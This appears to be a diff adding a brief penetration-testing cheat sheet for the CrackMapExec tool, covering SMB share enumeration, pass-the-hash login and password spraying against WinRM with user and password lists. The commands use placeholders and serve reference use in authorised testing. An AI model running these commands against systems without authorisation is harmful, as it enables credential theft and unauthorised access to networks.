@@ -1,0 +1,13 @@
+---
+tags: [ enumeration, password_cracking, pass_the_hash ]
+---
+# SMB
+# Enumerate shares
+cme smb <ip> --shares
+cme smb <ip> --shares -u 'dsdad' -p 'dsadd'
+# Pass The Hash
+cme smb <ip> -u <user> -H <hash>
+
+# WinRM
+# Password Cracking
+cme winrm <ip> -u <users.txt> -p <passwords.txt>
